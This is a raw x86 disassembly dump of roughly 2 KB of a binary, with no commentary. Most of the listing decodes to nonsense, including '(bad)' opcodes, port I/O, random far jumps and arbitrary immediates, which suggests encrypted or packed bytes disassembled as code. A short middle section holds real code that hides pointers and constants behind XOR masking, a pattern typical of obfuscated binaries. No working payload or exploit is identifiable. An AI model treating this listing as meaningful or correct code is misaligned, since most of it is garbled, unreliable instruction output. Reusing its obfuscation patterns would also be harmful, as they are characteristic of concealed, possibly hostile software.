  4132ff:	in     al,dx
  413300:	std    
  413301:	repz sti 
  413303:	mov    bl,bh
  413305:	loopne 0x4132dc
  413307:	aaa    
  413308:	ja     0x41328a
  41330a:	test   eax,0xacf7f61a
  41330f:	inc    edx
  413310:	cmp    al,0x96
  413312:	jmp    0x41333f
  413314:	jae    0xc15b053c
  41331a:	push   edx
  41331b:	in     eax,dx
  41331c:	pop    ss
  41331d:	adc    eax,0xe20e3509
  413322:	mov    eax,0xdad9a67c
  413327:	(bad)  
  413328:	sub    al,0xc4
  41332a:	lods   eax,DWORD PTR ds:[esi]
  41332b:	xor    bl,ch
  41332d:	pop    eax
  41332e:	nop
  41332f:	mov    ah,0xed
  413331:	add    eax,0xe2ac7142
  413336:	or     eax,0xd0e51926
  41333b:	pop    ss
  41333c:	cdq    
  41333d:	jmp    0xa33a:0xf7f1df8e
  413344:	xchg   BYTE PTR [edi],dl
  413346:	std    
  413347:	lock out 0xbd,al
  41334a:	push   DWORD PTR [eax]
  41334c:	lods   al,BYTE PTR ds:[esi]
  41334d:	adc    eax,0x3ebd23d3
  413352:	jno    0x413382
  413354:	cmp    ecx,esi
  413356:	inc    ebp
  413357:	cs push 0x2b17043d
  41335d:	in     eax,0x5b
  41335f:	ins    BYTE PTR es:[edi],dx
  413360:	cs call 0x5914:0x1a5fe6b2
  413368:	mov    ah,0x9d
  41336a:	clc    
  41336b:	sub    al,ah
  41336d:	daa    
  41336e:	test   al,0xc4
  413370:	and    eax,0x31a70d5d
  413375:	popf   
  413376:	mov    al,ds:0x3889ea20
  41337b:	jne    0x4133b7
  41337d:	popf   
  41337e:	or     BYTE PTR ds:0x37e38af,0xf9
  413385:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413386:	mov    ecx,0x9a81f137
  41338b:	push   esi
  41338c:	sub    DWORD PTR [edi+0x79c56777],ebp
  413392:	fisubr WORD PTR [edi-0x67a40ad5]
  413398:	shl    al,cl
  41339a:	mov    cl,BYTE PTR [ecx+0x9d1a02d]
  4133a0:	jne    0x4133b3
  4133a2:	add    eax,0x60f68f6f
  4133a7:	adc    ebp,esp
  4133a9:	test   BYTE PTR [eax-0x36deab91],bl
  4133af:	mov    dl,BYTE PTR [ecx]
  4133b1:	(bad)  
  4133b3:	in     al,dx
  4133b4:	inc    esi
  4133b5:	jb     0x41333f
  4133b7:	or     BYTE PTR [ebx],ch
  4133b9:	mov    esi,0x3d455cdb
  4133be:	mov    ?,WORD PTR [edx+0x71]
  4133c1:	(bad)  
  4133c2:	std    
  4133c3:	inc    edi
  4133c4:	dec    eax
  4133c5:	(bad)  
  4133c6:	into   
  4133c7:	jl     0x4133d3
  4133c9:	fnstenv ds:0xae80a496
  4133cf:	jp     0x413436
  4133d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133d2:	add    al,0x9e
  4133d4:	xchg   ecx,eax
  4133d5:	push   0x5455c4d
  4133da:	lock leave 
  4133dc:	data16 fwait
  4133de:	sahf   
  4133df:	repz sbb BYTE PTR [ebp-0x6a6b7933],dl
  4133e6:	push   edi
  4133e7:	fcomp  QWORD PTR [ecx]
  4133e9:	pop    ss
  4133ea:	hlt    
  4133eb:	xor    al,0xbe
  4133ed:	cmp    ecx,ecx
  4133ef:	aam    0x9b
  4133f1:	mov    cl,0x1
  4133f3:	loope  0x4133e8
  4133f5:	pop    esi
  4133f6:	xor    DWORD PTR [edx+0x18],0xe83ec65b
  4133fd:	jbe    0x413430
  4133ff:	adc    eax,DWORD PTR [ecx]
  413401:	cmp    DWORD PTR [edi+0x66a97787],0xc4c30a18
  41340b:	dec    ebp
  41340c:	push   ds
  41340d:	push   ds
  41340e:	push   0xfffffff7
  413410:	sub    eax,0x5257404a
  413415:	cmp    al,cl
  413417:	xor    al,0x1e
  413419:	add    DWORD PTR [ecx],esp
  41341b:	pop    ebx
  41341c:	hlt    
  41341d:	and    DWORD PTR [esp+ebp*2-0x4a],edx
  413421:	mov    al,0xfa
  413423:	mov    eax,ds:0x392f70c6
  413428:	ret    0x745f
  41342b:	xchg   edx,eax
  41342c:	adc    BYTE PTR [edx+0x3e],ah
  41342f:	shl    DWORD PTR [ebx-0x29],1
  413432:	out    0xd2,al
  413434:	retf   
  413435:	sub    bh,bh
  413437:	xchg   ebx,eax
  413438:	add    eax,0x2e52f32d
  41343d:	lock mov ah,0x73
  413440:	lahf   
  413441:	xlat   BYTE PTR ds:[ebx]
  413442:	pop    ebp
  413443:	cmp    eax,0xdd56aea0
  413448:	pushf  
  413449:	dec    esi
  41344a:	sub    ecx,DWORD PTR [edi-0x3]
  41344d:	cmp    ah,BYTE PTR [edx]
  41344f:	sbb    bh,bl
  413451:	fnstcw WORD PTR [eax-0x80]
  413454:	sub    BYTE PTR [edi],bh
  413456:	jns    0x4134be
  413458:	lock ret 
  41345a:	fcomp  DWORD PTR [esi+0x1c]
  41345d:	or     eax,0xf7ba6354
  413462:	jecxz  0x41348c
  413464:	pop    ebp
  413465:	cwde   
  413466:	mov    esi,DWORD PTR [edi+0x38a89799]
  41346c:	es ins DWORD PTR es:[edi],dx
  41346e:	sbb    eax,0x4aa15e72
  413473:	mov    edi,0x2343a5c8
  413478:	mov    ah,0xad
  41347a:	mov    al,0xa1
  41347c:	push   esp
  41347d:	inc    esi
  41347e:	xchg   ebx,eax
  41347f:	(bad)  
  413480:	scas   al,BYTE PTR es:[edi]
  413481:	xchg   ecx,eax
  413482:	jmp    0x4134b9
  413484:	pop    ecx
  413485:	adc    BYTE PTR [edx-0xb],0xfb
  413489:	push   esp
  41348a:	shl    DWORD PTR [ebp-0xb33e080],0x3f
  413491:	mov    ebx,0xbc4d3cb4
  413496:	push   ebx
  413497:	call   0x8cab:0xbeeab5a9
  41349e:	imul   DWORD PTR [ebx]
  4134a0:	push   ss
  4134a1:	out    0x1f,al
  4134a3:	mov    dl,BYTE PTR [ecx]
  4134a5:	xor    eax,0x5f0b09c3
  4134aa:	mov    cl,0x20
  4134ac:	pop    esi
  4134ad:	std    
  4134ae:	sub    ch,dl
  4134b0:	sub    BYTE PTR [ecx],ah
  4134b2:	rcl    BYTE PTR [ecx-0x6d],cl
  4134b5:	sar    ch,1
  4134b7:	pop    ecx
  4134b8:	push   ebp
  4134b9:	gs lock xchg esi,eax
  4134bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134bd:	or     al,0x26
  4134bf:	mov    WORD PTR es:[esi-0x7b],?
  4134c3:	in     eax,dx
  4134c4:	arpl   dx,cx
  4134c6:	cdq    
  4134c7:	or     eax,0xd4cee136
  4134cc:	and    eax,0x10d24316
  4134d1:	add    al,BYTE PTR [eax+0x65]
  4134d4:	pop    ds
  4134d5:	xchg   DWORD PTR [ebp-0x64],edi
  4134d8:	sub    eax,0x749a3599
  4134dd:	in     eax,dx
  4134de:	sbb    DWORD PTR [ecx-0x3f190d9e],ecx
  4134e4:	and    edi,ebp
  4134e6:	into   
  4134e7:	push   esp
  4134e8:	addr16 dec edi
  4134ea:	ss clc 
  4134ec:	fild   WORD PTR [esi+ecx*8]
  4134ef:	mov    ch,0x80
  4134f1:	lds    ebx,FWORD PTR [ebx]
  4134f3:	ss inc ecx
  4134f5:	adc    eax,0x56609afa
  4134fa:	mov    ah,al
  4134fc:	mov    cs,WORD PTR [ebx]
  4134fe:	frstor [eax+0x5fdbe8be]
  413504:	shl    ah,0x42
  413507:	sbb    DWORD PTR [ebp-0x67],ecx
  41350a:	lock jge 0x413564
  41350d:	mov    eax,ds:0x7210a2b6
  413512:	pop    ecx
  413513:	push   edi
  413514:	or     BYTE PTR [ebp+0x2e],dh
  413517:	aaa    
  413518:	in     al,dx
  413519:	xchg   esi,eax
  41351a:	mov    al,0xd1
  41351c:	lahf   
  41351d:	mov    DWORD PTR [eax-0x3a],ebp
  413520:	and    al,0xe9
  413522:	push   0xffffff82
  413524:	leave  
  413525:	mov    bh,0x97
  413527:	(bad)  
  413528:	jge    0x4134f9
  41352a:	fdiv   st(1),st
  41352c:	lea    esi,[ebp+0xaef40ec]
  413532:	fwait
  413533:	retf   
  413534:	or     eax,0x10dd3490
  413539:	scas   eax,DWORD PTR es:[edi]
  41353a:	pop    es
  41353b:	test   edi,eax
  41353d:	js     0x4134ff
  41353f:	jbe    0x4134ef
  413541:	mov    esp,0xbae1aa96
  413546:	stos   BYTE PTR es:[edi],al
  413547:	push   ss
  413548:	sub    edi,DWORD PTR [ecx]
  41354a:	(bad)  
  41354b:	jmp    0x4134f1
  41354d:	int    0xbe
  41354f:	sahf   
  413550:	and    esp,DWORD PTR [edx+eax*1-0x6177bb8d]
  413557:	gs call 0xbe83afcb
  41355d:	test   DWORD PTR [edx],esp
  41355f:	stos   BYTE PTR es:[edi],al
  413560:	inc    ecx
  413561:	cmp    eax,0x7506fedb
  413566:	jge    0x4135bd
  413568:	mov    ?,WORD PTR [esi]
  41356a:	icebp  
  41356b:	(bad)  
  41356c:	adc    ecx,DWORD PTR [edi]
  41356e:	mov    bl,bh
  413570:	jp     0x413589
  413572:	aaa    
  413573:	dec    eax
  413574:	(bad)  
  413575:	mov    ah,0xd5
  413577:	xor    eax,0x51a2b18d
  41357c:	fiadd  WORD PTR [eax-0x54]
  41357f:	(bad)  
  413580:	pop    edi
  413581:	dec    esi
  413582:	(bad)  
  413583:	imul   ecx,DWORD PTR [eax+0x1d8cd80a],0xffffffe1
  41358a:	adc    bh,0x1f
  41358d:	cmp    ebp,ebx
  41358f:	jae    0x41357a
  413591:	xchg   esi,eax
  413592:	adc    al,0x30
  413594:	xor    al,0x26
  413596:	adc    DWORD PTR [edi+0x2],esp
  413599:	lods   eax,DWORD PTR ds:[esi]
  41359a:	fmul   DWORD PTR [edx+0x35]
  41359d:	xor    al,0x5a
  41359f:	dec    eax
  4135a0:	pop    edx
  4135a1:	(bad)  
  4135a2:	and    eax,0x69a3d875
  4135a7:	mov    bl,0x73
  4135a9:	loop   0x413542
  4135ab:	imul   ecx,DWORD PTR [edx-0x8],0xfffffffd
  4135af:	cmp    esi,DWORD PTR [ecx+esi*2+0x66]
  4135b3:	push   esi
  4135b4:	aam    0xd2
  4135b6:	jge    0x41358a
  4135b8:	ins    BYTE PTR es:[edi],dx
  4135b9:	adc    BYTE PTR [eax],dl
  4135bb:	pop    ebp
  4135bc:	shl    DWORD PTR [edi],cl
  4135be:	xchg   esi,eax
  4135bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135c0:	ret    
  4135c1:	jbe    0x4135c6
  4135c3:	stos   BYTE PTR es:[edi],al
  4135c4:	shl    ebx,1
  4135c6:	inc    eax
  4135c7:	sbb    ebx,DWORD PTR [edx+0x10]
  4135ca:	xchg   ebx,eax
  4135cb:	inc    esi
  4135cc:	rol    DWORD PTR [edx+0x54adb84],0xde
  4135d3:	mov    dl,0xd4
  4135d5:	ret    0x2dbf
  4135d8:	imul   esi,DWORD PTR [eax-0x5d],0x2b
  4135dc:	ja     0x413658
  4135de:	jo     0x4135de
  4135e0:	or     DWORD PTR [ebp-0x2e29d984],ebp
  4135e6:	adc    eax,0x1bb0ef23
  4135eb:	les    esp,FWORD PTR [esi+ecx*4]
  4135ee:	mov    eax,0x9fdee68e
  4135f3:	push   DWORD PTR [edx]
  4135f5:	jb     0x413641
  4135f7:	xchg   DWORD PTR [eax+0xc],ecx
  4135fa:	adc    BYTE PTR [ecx-0x5d],ch
  4135fd:	sub    eax,0x99f0e762
  413602:	or     bl,BYTE PTR [eax+ebp*8]
  413605:	popf   
  413606:	ins    DWORD PTR es:[edi],dx
  413607:	or     al,0x10
  413609:	xchg   DWORD PTR [esi+0x47c7c170],edx
  41360f:	ja     0x41361a
  413611:	call   0xdeb:0x490f197c
  413618:	cmp    eax,0x1224a14a
  41361d:	jmp    0x413678
  41361f:	push   ds
  413620:	pop    es
  413621:	pop    ebp
  413622:	mov    dh,0x17
  413624:	scas   eax,DWORD PTR es:[edi]
  413625:	jecxz  0x4135f0
  413627:	bound  eax,QWORD PTR [edi]
  413629:	add    eax,DWORD PTR [ecx+0x4887e07a]
  41362f:	mov    dh,cl
  413631:	xor    eax,0x56e333ea
  413636:	es mov esi,0x97eb06ea
  41363c:	div    bl
  41363e:	adc    BYTE PTR [ebp-0x3496d606],dl
  413644:	daa    
  413645:	add    ch,BYTE PTR [eax+ebx*8]
  413648:	xor    al,0x6c
  41364a:	pop    ebp
  41364b:	mov    ?,WORD PTR [ebx+0x7d]
  41364e:	push   edi
  41364f:	call   0x2afa3ff4
  413654:	inc    esp
  413655:	repnz adc eax,0x7db50be5
  41365b:	mov    eax,ds:0x631ae7d3
  413660:	ins    BYTE PTR es:[edi],dx
  413661:	pop    ebp
  413662:	lea    ecx,[eax-0x63eb6e5c]
  413668:	add    edx,DWORD PTR [eiz*4-0x6cbb1b50]
  41366f:	and    ebp,ebp
  413671:	inc    ecx
  413672:	xchg   edi,eax
  413673:	adc    ah,al
  413675:	mov    WORD PTR [esi+0x7be2aa13],?
  41367b:	push   edx
  41367c:	test   al,0x89
  41367e:	rol    BYTE PTR [esi],1
  413680:	adc    ch,BYTE PTR [edi-0x5a]
  413683:	repz adc ebp,0xa9dec19e
  41368a:	jae    0x413618
  41368c:	push   0xaebbe52a
  413691:	cs shr bh,1
  413694:	je     0x413634
  413696:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413697:	enter  0x21e3,0x73
  41369b:	jle    0x4136a7
  41369d:	mov    esp,0x1e4e51e4
  4136a2:	retf   
  4136a3:	bound  eax,QWORD PTR [eax]
  4136a5:	adc    al,BYTE PTR [ecx]
  4136a7:	push   eax
  4136a8:	adc    al,dh
  4136aa:	(bad)  
  4136ab:	jnp    0x413689
  4136ad:	out    dx,eax
  4136ae:	test   al,0x5d
  4136b0:	sub    al,0xa9
  4136b2:	adc    eax,0x16a3f961
  4136b7:	dec    edi
  4136b8:	aaa    
  4136b9:	sbb    BYTE PTR [ebx+0x47],al
  4136bc:	(bad)  
  4136bd:	out    0x88,al
  4136bf:	mov    esi,0x33f45d8b
  4136c4:	(bad)  
  4136c5:	add    edx,edi
  4136c7:	imul   edx,ebx
  4136ca:	mov    ebx,DWORD PTR [ebp-0x8]
  4136cd:	mov    BYTE PTR [edx+ebx*1],al
  4136d0:	mov    eax,DWORD PTR [ebp-0x30]
  4136d3:	mov    edx,DWORD PTR [ebp-0x3c]
  4136d6:	xor    eax,esi
  4136d8:	xor    edx,esi
  4136da:	add    eax,edi
  4136dc:	add    edx,edi
  4136de:	imul   eax,edx
  4136e1:	add    eax,DWORD PTR [ebp-0xc]
  4136e4:	mov    DWORD PTR [ebp-0xc],eax
  4136e7:	mov    eax,DWORD PTR [ebp-0xc]
  4136ea:	mov    edx,DWORD PTR [ebp-0x24]
  4136ed:	cmp    edx,eax
  4136ef:	jb     0x411257
  4136f5:	mov    eax,DWORD PTR [ebp-0x3c]
  4136f8:	mov    edx,DWORD PTR [ebp-0x24]
  4136fb:	xor    eax,esi
  4136fd:	add    eax,edi
  4136ff:	imul   eax,edx
  413702:	mov    edx,DWORD PTR [ebp-0x20]
  413705:	xor    edx,esi
  413707:	add    edx,edi
  413709:	or     eax,edx
  41370b:	mov    edx,DWORD PTR [ebp-0x18]
  41370e:	xor    edx,esi
  413710:	add    eax,edx
  413712:	mov    edx,DWORD PTR [ebp-0x18]
  413715:	xor    edx,esi
  413717:	add    eax,edx
  413719:	mov    edx,DWORD PTR [ebp-0x10]
  41371c:	lea    eax,[eax+edx*1+0x64e5b6]
  413723:	jmp    0x413737
  413728:	mov    eax,DWORD PTR [ebp-0x18]
  41372b:	mov    edx,DWORD PTR [ebp-0x10]
  41372e:	xor    eax,esi
  413730:	lea    eax,[eax+edx*1+0x3272db]
  413737:	mov    DWORD PTR [ebp-0x10],eax
  41373a:	jmp    0x4111a4
  41373f:	mov    eax,DWORD PTR [ebp-0x38]
  413742:	mov    edx,DWORD PTR [ebp+0xc]
  413745:	xor    edx,esi
  413747:	lea    ecx,[ecx+edx*1+0x3272db]
  41374e:	lea    edx,[ecx-0x3272db]
  413754:	xor    edx,esi
  413756:	cmp    edx,0xf89c95b6
  41375c:	jne    0x410fde
  413762:	mov    ecx,DWORD PTR [ebp+0x8]
  413765:	mov    edx,DWORD PTR [ebp+0xc]
  413768:	mov    ebx,DWORD PTR [ebp+0x8]
  41376b:	xor    edx,esi
  41376d:	mov    dl,BYTE PTR [edx+eax*1+0x3272db]
  413774:	xor    ecx,esi
  413776:	mov    cl,BYTE PTR [ecx+eax*1+0x3272db]
  41377d:	xor    ebx,esi
  41377f:	mov    BYTE PTR [ebx+eax*1+0x3272db],dl
  413786:	jmp    0x415b38
  41378b:	xlat   BYTE PTR ds:[ebx]
  41378c:	repz mov bh,0xb2
  41378f:	xchg   ebx,eax
  413790:	mov    fs,WORD PTR [edi+0xef9e63]
  413796:	mov    bl,0x82
  413798:	les    edx,FWORD PTR [eax]
  41379a:	test   eax,0x62626ba2
  41379f:	int    0x5f
  4137a1:	bound  esp,QWORD PTR [edx-0x36]
  4137a4:	adc    DWORD PTR [ebx-0x4e],0xf5ce8aae
  4137ab:	and    esi,DWORD PTR [edi]
  4137ad:	or     eax,0xf6ed186d
  4137b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137b3:	cdq    
  4137b4:	mov    al,ds:0xeb6bdcbb
  4137b9:	mov    esp,0x30885b38
  4137be:	or     BYTE PTR [edi-0x1f312baa],bl
  4137c4:	adc    ch,al
  4137c6:	shl    BYTE PTR [ecx+0x53dbedf5],1
  4137cc:	rcl    bh,cl
  4137ce:	pushf  
  4137cf:	push   edi
  4137d0:	mov    bh,0x55
  4137d2:	es cmp eax,0xd24fd8c
  4137d8:	dec    ecx
  4137d9:	mov    edi,0x5fd054a5
  4137de:	outs   dx,BYTE PTR ds:[esi]
  4137df:	pop    ecx
  4137e0:	mov    ds:0xd496e56f,eax
  4137e5:	and    al,BYTE PTR [edx-0x4f]
  4137e8:	or     ah,BYTE PTR [ebx+0x78]
  4137eb:	adc    DWORD PTR [esi-0x45],eax
  4137ee:	sbb    dh,0xd9
  4137f1:	cmp    DWORD PTR ds:0x6a62f4a9,ecx
  4137f7:	add    DWORD PTR [edx+0x31],0xffffffd3
  4137fb:	out    dx,al
  4137fc:	fsubr  QWORD PTR [edx]
  4137fe:	lods   al,BYTE PTR ds:[esi]
  4137ff:	sub    DWORD PTR ds:0x12498a75,ebx
  413805:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413806:	pop    ebp
  413807:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413808:	test   eax,0xa5fc0145
  41380d:	sbb    DWORD PTR [ebx+0xa],eax
  413810:	inc    edx
  413811:	jmp    0x2703:0xcaa43811
  413818:	cli    
  413819:	mov    fs,WORD PTR [edx+0x613ff094]
  41381f:	inc    ebp
  413820:	sbb    al,0x6b
  413822:	retf   0x3d58
  413825:	or     ecx,DWORD PTR [esi+0x4e156c10]
  41382b:	cs (bad) 
  41382d:	mov    dl,0xf8
  41382f:	(bad)  
  413831:	xor    eax,0x6c18941e
  413836:	iret   
  413837:	clc    
  413838:	sub    DWORD PTR [esi+ebx*1],edx
  41383b:	jge    0x413843
  41383d:	lods   eax,DWORD PTR ds:[esi]
  41383e:	mov    eax,0x38089614
  413843:	shl    ebp,0x6d
  413846:	lods   eax,DWORD PTR ds:[esi]
  413847:	push   edi
  413848:	jnp    0x413872
  41384a:	fstp   TBYTE PTR [edx+eax*8-0x6435218f]
  413851:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413852:	push   esp
  413853:	loop   0x4137fc
  413855:	adc    ebx,DWORD PTR [ecx-0x43cadee6]
  41385b:	rol    esi,0x42
  41385e:	dec    edi
  41385f:	out    0x8a,eax
  413861:	aam    0xe4
  413863:	jno    0x4138c7
  413865:	in     al,dx
  413866:	jae    0x413837
  413868:	push   esp
  413869:	inc    esp
  41386a:	xchg   esi,eax
  41386b:	int    0x7e
  41386d:	pop    ss
  41386e:	je     0x413878
  413870:	repnz and DWORD PTR [ebx+eiz*4],0xfffffff3
  413875:	sub    ah,BYTE PTR [edi]
  413877:	(bad)  
  413878:	sbb    eax,0x9a2ec234
  41387d:	add    eax,0xf777efdc
  413882:	fsubp  st(6),st
  413884:	add    ecx,0xade4ba51
  41388a:	btc    ebx,edx
  41388d:	push   esi
  41388e:	adc    edx,edi
  413890:	dec    esi
  413891:	hlt    
  413892:	jmp    0x5bd0:0xb6edce79
  413899:	cwde   
  41389a:	xchg   BYTE PTR [esi+ebx*8-0x7c],dl
  41389e:	push   cs
  41389f:	arpl   WORD PTR ds:0x8be08705,bx
  4138a5:	xchg   ecx,eax
  4138a6:	loopne 0x41390f
  4138a8:	sbb    edi,esp
  4138aa:	int3   
  4138ab:	xor    al,BYTE PTR [edx+0x823e3d7]
  4138b1:	iret   
  4138b2:	ret    0x4659
  4138b5:	mov    WORD PTR [edi-0xafe461e],fs
  4138bb:	push   ds
  4138bc:	mul    DWORD PTR [eax-0x16]
  4138bf:	jno    0x413870
  4138c1:	push   esi
  4138c2:	jbe    0x4138ef
  4138c4:	sub    ebx,0xffffffd4
  4138c7:	ds jle 0x413936
  4138ca:	out    0xf9,eax
  4138cc:	sbb    BYTE PTR [edx-0x591ca92c],bl
  4138d2:	outs   dx,DWORD PTR ds:[esi]
  4138d3:	ror    al,1
  4138d5:	rcl    BYTE PTR [eax-0x799bc6e0],1
  4138db:	rcl    DWORD PTR [edi-0x7abc06a7],1
  4138e1:	not    edx
  4138e3:	dec    ebx
  4138e4:	repz fwait
  4138e6:	add    ebx,DWORD PTR [esp+ebx*2+0x52aa4995]
  4138ed:	push   edi
  4138ee:	aam    0xf6
  4138f0:	jmp    0x41396c
  4138f2:	cli    
  4138f3:	ins    BYTE PTR es:[edi],dx
  4138f4:	jge    0x4138da
  4138f6:	pop    ss
  4138f7:	retf   
  4138f8:	(bad)  
  4138f9:	stos   DWORD PTR es:[edi],eax
  4138fa:	inc    esp
  4138fb:	mov    esp,0xf82d2b44
  413900:	push   esi
  413901:	pop    ecx
  413902:	jp     0x413928
  413904:	or     al,0x47
  413906:	fidivr DWORD PTR [edi+0x1b725f76]
  41390c:	shl    DWORD PTR ds:0xc0c2c383,1
  413912:	dec    esi
  413913:	xor    bl,BYTE PTR [esi-0x2a]
  413916:	aad    0x78
  413918:	or     eax,0x5746bba7
  41391d:	stos   DWORD PTR es:[edi],eax
  41391e:	ret    0xb04b
  413921:	lahf   
  413922:	mov    al,ds:0x3e286919
  413927:	shl    DWORD PTR [esi],1
  413929:	retf   
  41392a:	mov    esi,0x96567f2
  41392f:	mov    DWORD PTR [ebp-0x76],eax
  413932:	push   ebp
  413933:	push   esp
  413934:	int    0xee
  413936:	and    DWORD PTR [edx+0x41876ed1],edx
  41393c:	xchg   edi,eax
  41393d:	sahf   
  41393e:	add    dl,cl
  413940:	into   
  413941:	int    0xb4
  413943:	pop    esp
  413944:	(bad)
  413947:	mov    ah,0x9f
  413949:	pop    ds
  41394a:	push   ebp
  41394b:	cmc    
  41394c:	rcr    DWORD PTR [edx-0x5b28d995],0xec
  413953:	sub    esp,ebx
  413955:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413956:	dec    edi
  413957:	push   ebp
  413958:	test   cl,bl
  41395a:	or     bh,BYTE PTR [edi+0x46]
  41395d:	jns    0x4138ea
  41395f:	iret   
  413960:	fistp  QWORD PTR [ebp-0x2d]
  413963:	out    dx,eax
  413964:	fdivr  st,st(7)
  413966:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413967:	shl    BYTE PTR [ebp-0x28],cl
  41396a:	cli    
  41396b:	cdq    
  41396c:	add    DWORD PTR [ecx-0x2f],ebp
  41396f:	mov    bl,ah
  413971:	mov    dh,ah
  413973:	loop   0x41396c
  413975:	cmc    
  413976:	xchg   edi,eax
  413977:	out    dx,eax
  413978:	jecxz  0x4139d1
  41397a:	div    DWORD PTR [ecx]
  41397c:	popa   
  41397d:	sbb    bh,al
  41397f:	cmp    dh,dh
  413981:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413982:	push   ecx
  413983:	xlat   BYTE PTR ds:[ebx]
  413984:	fisub  DWORD PTR [ebp-0x7a]
  413987:	mov    cl,0xeb
  413989:	out    dx,eax
  41398a:	clc    
  41398b:	pop    di
  41398d:	and    al,0xfa
  41398f:	mov    edi,0xf19607ba
  413994:	push   0x3
  413996:	adc    BYTE PTR [ebx+edx*2-0x52b9d3a2],cl
  41399d:	jecxz  0x4139d9
  41399f:	mov    ch,0x64
  4139a1:	push   0xfffffff9
  4139a3:	jmp    0xe3ea308f
  4139a8:	mov    eax,0x3f8d39d5
  4139ad:	add    BYTE PTR [edi],ah
  4139af:	and    DWORD PTR [ecx+0x77158a73],esi
  4139b5:	lahf   
  4139b6:	inc    esi
  4139b7:	xlat   BYTE PTR ds:[ebx]
  4139b8:	fld    DWORD PTR [esi+0x30]
  4139bb:	xor    al,0xaf
  4139bd:	pop    esi
  4139be:	adc    al,0xd4
  4139c0:	mov    dl,0xad
  4139c2:	sahf   
  4139c3:	ja     0x413991
  4139c5:	stos   BYTE PTR es:[edi],al
  4139c6:	mov    esp,0xaa53b93d
  4139cb:	jle    0x413a29
  4139cd:	ja     0x413954
  4139cf:	pop    eax
  4139d0:	mov    eax,ds:0x4532206c
  4139d5:	sub    cl,BYTE PTR [edi+0x9ebbff4]
  4139db:	and    cl,BYTE PTR [esi+esi*4+0x4aa70682]
  4139e2:	bound  edi,QWORD PTR [ecx+0x54]
  4139e5:	iret   
  4139e6:	sub    ecx,eax
  4139e8:	sub    al,0xae
  4139ea:	mov    edx,0xe494d37a
  4139ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139f0:	call   0x850ad632
  4139f5:	test   al,0xa8
  4139f7:	jg     0x4139a3
  4139f9:	fs clc 
  4139fb:	xchg   esi,eax
  4139fc:	popf   
  4139fd:	(bad)  
  4139ff:	scas   al,BYTE PTR es:[edi]
  413a00:	mov    eax,ds:0x95c88831
  413a05:	xchg   edi,eax
  413a06:	add    DWORD PTR [esi*2-0x147b0521],esi
  413a0d:	out    dx,al
  413a0e:	mov    bl,0x61
  413a10:	inc    ecx
  413a11:	test   BYTE PTR [eax+eiz*2-0x5cc343ae],ch
  413a18:	and    DWORD PTR [eax+ebp*8-0x4db405b5],esp
  413a1f:	imul   BYTE PTR [esi]
  413a21:	cli    
  413a22:	fdivr  st(6),st
  413a24:	xor    eax,eax
  413a26:	dec    esi
  413a27:	xor    BYTE PTR [edx+0x1255e251],ah
  413a2d:	out    dx,al
  413a2e:	xchg   ebx,eax
  413a2f:	mov    ?,ecx
  413a31:	ret    0x7232
  413a34:	hlt    
  413a35:	or     al,0xcb
  413a37:	inc    esi
  413a38:	pop    eax
  413a39:	mov    ?,WORD PTR ds:0xbdf8daf8
  413a3f:	jmp    0x563cb296
  413a44:	sub    eax,ecx
  413a46:	inc    edi
  413a47:	xchg   ebx,eax
  413a48:	std    
  413a49:	mov    ch,BYTE PTR [eax+0x3c]
  413a4c:	adc    al,0x1a
  413a4e:	dec    ebp
  413a4f:	sub    edx,DWORD PTR [ebx+0x1498596a]
  413a55:	in     al,dx
  413a56:	dec    ecx
  413a57:	dec    edx
  413a58:	leave  
  413a59:	not    BYTE PTR [edi+0x4cf56f69]
  413a5f:	adc    esi,DWORD PTR [edi-0x35cc5a85]
  413a65:	and    al,0xf5
  413a67:	lock inc edx
  413a69:	mov    WORD PTR [ecx],es
  413a6b:	adc    edx,eax
  413a6d:	and    cl,BYTE PTR [ebp+ebp*4-0x7c]
  413a71:	mov    ch,0xe0
  413a73:	and    al,0x6b
  413a75:	inc    esi
  413a76:	sub    al,0x5e
  413a78:	retf   0x3fd9
  413a7b:	into   
  413a7c:	and    dl,BYTE PTR [edi]
  413a7e:	aam    0x2
  413a80:	inc    ebp
  413a81:	mov    ?,WORD PTR ds:0xc5a49b60
  413a87:	enter  0xc2cd,0xc8
  413a8b:	and    BYTE PTR [ebx],al
  413a8d:	ja     0x413ac1
  413a8f:	shl    BYTE PTR [ecx+0x7c],cl
  413a92:	push   ecx
  413a93:	jnp    0x413ade
  413a95:	clc    
  413a96:	xchg   DWORD PTR [eax-0x6f],ecx
  413a99:	fisub  DWORD PTR [ebx-0x19703aa6]
  413a9f:	sahf   
  413aa0:	int3   
  413aa1:	add    bh,ch
  413aa3:	push   ebx
  413aa4:	mov    bl,0xa0
  413aa6:	fmul   st,st(0)
  413aa8:	push   es
  413aa9:	pop    ss
  413aaa:	mov    ecx,0x63706592
  413aaf:	xor    dl,BYTE PTR [esi+0x2b464972]
  413ab5:	adc    edx,ecx
  413ab7:	push   ebx
  413ab8:	mov    cl,0xd8
  413aba:	add    eax,0x72796bbf
  413abf:	add    BYTE PTR [edi-0x519753f6],0x82
  413ac6:	in     eax,dx
  413ac7:	sub    BYTE PTR [ecx-0x6db46ce5],0x19
  413ace:	or     DWORD PTR [ebp+edi*1-0x6911160e],0x233bf59
  413ad9:	dec    edx
  413ada:	dec    BYTE PTR [edx-0x4d]
  413add:	fimul  WORD PTR [ebx-0x14a9e835]
  413ae3:	dec    esp
  413ae4:	out    dx,al
  413ae5:	sar    DWORD PTR [ebp+0x2],1
  413ae8:	xchg   ecx,eax
  413ae9:	ror    BYTE PTR [ecx+0x29],cl
  413aec:	inc    ecx
  413aed:	push   0xffffffdd
  413aef:	push   edi
  413af0:	jnp    0x413b55
  413af2:	(bad)  
  413af4:	inc    esi
  413af5:	sbb    eax,0xb7bd894d
  413afa:	push   ebx
  413afb:	stc    
  413afc:	daa    
  413afd:	dec    ebx
  413afe:	stc    
  413aff:	daa    
